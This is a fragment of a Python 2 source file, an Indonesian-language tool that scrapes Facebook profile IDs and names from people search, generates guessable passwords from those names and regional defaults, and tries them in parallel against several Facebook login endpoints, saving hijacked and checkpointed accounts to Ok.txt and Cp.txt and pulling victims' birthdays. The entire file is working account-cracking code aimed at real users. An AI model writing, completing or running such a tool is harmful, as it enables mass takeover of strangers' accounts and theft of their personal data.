						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))

		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print ('\n\n'+war+'Selesai')
	print (war+'File Dump Tersimpan : '+fl)
	raw_input(" {Kembali}")
	menu()
def cek(arg):
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return True
		else:return False
	else:return False
def dumpfl():
	cvds=None
	new=None
	if cek(1)==False:
		try:
			cookie=cvd(open("coki.log").read().strip())
			cvds=cvd(cookie)
			new=True
		except:
			print(war+"Cookies Invalid");login()
	else:
		cvds=cvd(open("coki.log").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		if new==True:
			open("coki.log","w").write(cookie)
		s=raw_input(inp+"Query : ")
		fl=raw_input(inp+"Nama File : ").replace(" ","_")
		search(
			fl,cvds,
		"https://m.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove("coki.log")
		except:
			pass
		print(war+"Cookies Invalid");login()
def mfb(em,pas,hosts):
    global ua,mfb_h
    r = requests.Session()
    r.headers.update(mfb_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def graph(em,pas,hosts):
	global ua,graph_h
	r=requests.Session()
	r.headers.update(graph_h)
	p=r.get("https://graph.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	dtg="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":dtg,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic2(em,pas,hosts):
	global ua,mbasic_h2
	r=requests.Session()
	r.headers.update(mbasic_h2)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def metode():
    print ('\n'+satu+'Metode Crack mbasic.facebook.com')
    print (dua+'Metode Crack m.facebook.com')
    print (tiga+'Metode Crack free.facebook.com')
    print (empat+'Metode Crack graph.facebook.com')
    md = raw_input(inp+'Input : ')
    if md == '':
        os.sys.exit()
    elif md == '1' or md == '01':
      ttl = raw_input('\n'+inp++'Crack Pakai Tanggal Lahir (y/n) : ')
      if ttl == '':
          menu()
      elif ttl == 'y' or ttl == 'Y':
          crack1()
      elif ttl == 'n' or ttl == 'N':
          crack()
      else:
          exit(war+'Isi Dengan Benar')
    elif md == '2' or md == '02':
	crack2()
    elif md == '3' or md == '03':
	crack3()
    elif md == '4' or md == '04':
	crack4()
    else:
        exit(war+'Isi Dengan Benar')
def generate(text):
	global lok
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in lok:
                                        results.append("sayang")
				if "pakistan" in lok:
					results.append("786786")
				if "bangladesh" in lok:
					results.append("102030")
	return results
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input(inp+"Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'File Tidak Ada')
					continue
				print(blt+'Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
				print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
                        print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input(inp+"Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'File Tidak Ada')
					continue
				print(blt+'Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
				print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
                        print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic2(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					try:
						tomken = open('login.txt','r').read()
						q = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+tomken)
						qw = json.loads(q.text)
						ttl = qw["birthday"]
						month, day, year = ttl.split("/")
						tl = day+'/'+month+'/'+year

					except (KeyError, IOError):
					 tl = ' '
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;96m "+tl+"    "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n"+inp+"Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'File Tidak Ada')
					continue
				print(blt+'Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
				print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
                        print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n"+inp+"Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'File Tidak Ada')
					continue
				print(blt+'Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
				print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
                        print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack4:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n"+inp+"Pakai Password Manual (y/n) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'File Tidak Ada')
					continue
				print(blt+'Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="n":
				try:
					while True:
						try:
							self.apk= raw_input(inp+'Nama File : ')
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print('\n'+blt+'Hasil Ok Tersimpan Di Ok.txt')
				print(blt+'Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n{Selesai}')
				break
	def pwlist(self):
		self.pw=raw_input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('\n'+blt+'Hasil '+I+'OK'+p+' DiSimpan Di '+I+'OK.txt')
                        print(blt+'Hasil '+k+'CP'+p+' DiSimpan Di '+K+'CP.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n{Selesai}')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"      "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s \n\n"%(fl.get("id"),i))
					ko="%s | %s \n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("Cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[37m [Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system('git pull')
	try:
		cek_cookies()
	except Exception as e:
		exit(war+'Error : %s'%(e))
